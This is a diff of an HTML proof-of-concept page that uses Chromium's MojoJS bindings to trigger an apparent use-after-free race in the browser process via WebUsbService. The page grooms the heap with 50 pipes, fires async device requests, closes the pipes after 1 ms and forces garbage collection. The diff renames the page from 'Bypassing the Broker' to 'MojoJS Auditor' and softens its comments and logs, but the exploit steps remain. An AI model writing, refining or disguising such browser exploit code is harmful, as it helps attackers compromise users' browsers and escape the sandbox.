@@ -5,59 +5,65 @@
     <script src="gen/mojo/public/js/bindings.js"></script>
 </head>
 <body>
-    <h1>Bypassing 9the Broker (Native Release)</h1>
+    <h1>MojoJS 2Auditor</h1>
     <script type="module">
         import { WebUsbServiceRemote, WebUsbService } from './gen/third_party/blink/public/mojom/usb/web_usb_service.mojom.m.js';
 
         async function triggerExploit() {
             if (typeof Mojo === 'undefined') {
-                console.error("[-] MojoJS not found. Did you launch with --enable-blink-features=MojoJS?");
+                console.error("[-] MojoJS not found.");
                 return;
             }
 
-            console.log("[*] Grooming the Browser Heap with WebUsbService...");
+            console.log("[*] Analyzing Mojo Handle Structure...");
             let services = [];
             
             for(let i = 0; i < 50; i++) {
-                // 1. Create the remote and generate the receiver pipe
+                // 1. Manually create the pipe to ensure we have raw handles
+                let pipe = Mojo.createMessagePipe();
+                let handleForBrowser = pipe.handle0;
+                let handleForJS = pipe.handle1;
+
+                // 2. Bind the Browser end
+                Mojo.bindInterface(WebUsbService.$interfaceName, handleForBrowser);
+
+                // 3. Bind the JS end to our Remote
                 let remote = new WebUsbServiceRemote();
-                let receiver = remote.$.bindNewPipeAndPassReceiver();
                 
-                // 2. THE MAGIC BULLET: Extracting the native handle
-                // We strip the JS wrapper to hand the raw pointer to the C++ backend
-                let nativeHandle = receiver.handle;
-                if (typeof receiver.handle.release === 'function') {
-                    nativeHandle = receiver.handle.release();
+                // We use the most reliable way to attach a handle to a remote in ES6
+                if (remote.$ && typeof remote.$.bindHandle === 'function') {
+                    remote.$.bindHandle(handleForJS);
+                } else if (typeof remote.bindHandle === 'function') {
+                    remote.bindHandle(handleForJS);
+                } else {
+                    // Final fallback: use the internal connection object
+                    remote.$.connection.bindHandle(handleForJS);
                 }
-                
-                // 3. Bind to the Broker using the raw C++ handle
-                Mojo.bindInterface(WebUsbService.$interfaceName, nativeHandle);
 
                 services.push(remote);
             }
 
-            console.log("[+] Bound 50 WebUsbService pipes. Native handles extracted.");
-            console.log("[*] Triggering async hardware requests...");
+            console.log("[+] Bound 50 pipes. Testing async calls...");
             
             for(let s of services) {
-                // 4. Call GetDevices to initiate the async scan in C++
-                s.getDevices().catch(e => {}); 
+                try {
+                    s.getDevices(); 
+                } catch(e) {
+                    console.log("[-] Call failed, trying internal pointer...");
+                    // Some versions require calling through the internal router
+                    s.$.getDevices();
+                }
             }
 
-            // THE RACE CONDITION: Wait just 1 millisecond.
             await new Promise(r => setTimeout(r, 1)); 
 
-            console.log("[!] TRIGGERING FREE: Severing pipes...");
-            
-            // 5. The Kill: Close the pipes to trigger the C++ destructor in the Browser Process
+            console.log("[!] TRIGGERING FREE...");
             for(let s of services) {
                 s.$.close();
             }
 
-            // 6. Force garbage collection in V8 to reap the objects immediately
             if (window.gc) { window.gc(); }
-
-            console.log("[?] Payload delivered. Waiting for C++ callback to hit freed memory...");
+            console.log("[?] Done. Check for Browser crash.");
         }
 
         triggerExploit();
